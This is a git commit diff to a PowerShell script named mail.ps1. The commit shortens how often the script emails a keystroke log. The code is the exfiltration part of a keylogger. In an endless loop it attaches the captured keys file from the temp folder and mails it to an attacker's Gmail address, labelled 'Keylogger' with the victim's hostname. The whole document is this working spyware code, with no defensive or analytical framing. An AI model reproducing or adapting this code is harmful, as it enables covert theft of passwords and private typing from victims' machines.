97d8b52be35495558dd544b742461445bc47163b
turuu1 <39732369+turuu1@users.noreply.github.com>
2020-06-13 19:30:17 +0800

    Update mail.ps1

--- mail.ps1
+++ mail.ps1
@@ -7,4 +7,4 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'malchinhacker@gmail.com'
 $ReportEmail.To.Add('malchinhacker@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 360} 
+while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 20} 
